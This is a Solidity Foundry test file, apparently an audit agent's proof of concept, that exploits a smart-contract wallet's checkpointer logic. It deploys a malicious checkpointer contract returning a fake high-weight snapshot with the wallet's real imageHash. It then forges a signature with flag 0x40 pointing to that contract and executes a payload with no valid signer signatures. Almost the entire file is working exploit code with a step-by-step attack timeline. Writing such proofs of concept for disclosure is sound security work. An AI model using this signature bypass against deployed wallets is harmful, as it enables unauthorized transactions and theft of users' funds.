pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/integrations/extensions/sessions/ExtendedSessionTestBase.sol";
import "../src/modules/Payload.sol";
import "../src/modules/interfaces/ICheckpointer.sol";

// ATTACK TIMELINE:
// 1. [Setup] Deploy MaliciousCheckpointer that returns a fake Snapshot with the Wallet's real imageHash and high weight.
// 2. [T=0] Create a valid Wallet topology and deploy the Wallet via the test harness.
// 3. [T=1] Attacker crafts a payload to call mockTarget.
// 4. [T=2] Attacker constructs a raw signature with flag 0x40 (checkpointer present) and embeds the MaliciousCheckpointer address.
// 5. [T=3] Attacker calls Wallet.execute() with the malicious signature.
// 6. [Assert] The Wallet's recover() reads the checkpointer address from the signature bytes, calls it, receives the fake high-weight snapshot, and successfully executes the payload without valid signer signatures.

contract MaliciousCheckpointer {
    bytes32 public fakeImageHash;
    uint256 public fakeWeight;

    constructor(bytes32 _imageHash, uint256 _weight) {
        fakeImageHash = _imageHash;
        fakeWeight = _weight;
    }

    // Fallback to catch any checkpointer call and return a fake Snapshot
    // Sequence V3 checkpointer typically returns (bytes32 imageHash, uint256 weight) or similar struct
    fallback() external payable {
        assembly {
            mstore(0x00, fakeImageHash)
            mstore(0x20, fakeWeight)
            return(0x00, 0x40)
        }
    }
}

contract AuditAgentPoC is ExtendedSessionTestBase {
    function test_exploit() public {
        // 1. Create a topology and Wallet
        string memory topology = _createDefaultTopology();
        (Stage1Module Wallet, string memory config, bytes32 imageHash) = _createWallet(topology);

        // 2. Deploy the malicious checkpointer that will return a fake snapshot matching the Wallet's imageHash
        MaliciousCheckpointer maliciousCheckpointer = new MaliciousCheckpointer(imageHash, 1000);

        // 3. Build the payload to execute
        Payload.Decoded memory payload = _buildPayload(1);
        payload.calls[0].to = address(mockTarget);

        // 4. Craft the malicious signature bytes
        // Flag byte: 0x40 (bit 6 set = checkpointer address present in signature)
        // Next 20 bytes: address of the malicious checkpointer
        // Remaining bytes: dummy data to satisfy any length checks (e.g., 65 bytes of zeros)
        bytes memory sigBytes = abi.encodePacked(
            uint8(0x40),
            address(maliciousCheckpointer),
            new bytes(65)
        );

        // Encode the signature in the format expected by the Wallet
        // The config string is used by the Wallet to verify the imageHash, but the checkpointer bypasses the actual signature verification
        string memory signatures = string(abi.encodePacked(vm.toString(address(maliciousCheckpointer)), ":sapient:", vm.toString(sigBytes)));
        bytes memory encodedSignature = PrimitivesRPC.toEncodedSignature(vm, config, signatures, false);
        bytes memory packedPayload = PrimitivesRPC.toPackedPayload(vm, payload);

        // 5. Execute the payload with the malicious signature
        // The Wallet's recover() function will read the checkpointer address from the signature bytes,
        // call it, and receive a fake snapshot with high weight, granting unauthorized access.
        vm.prank(address(entryPoint));
        Wallet.execute(packedPayload, encodedSignature);

        // 6. Assert that the payload was executed successfully
        // If the exploit works, the mockTarget should have been called
        assertTrue(mockTarget.called(), "Exploit failed: payload was not executed");
    }
}
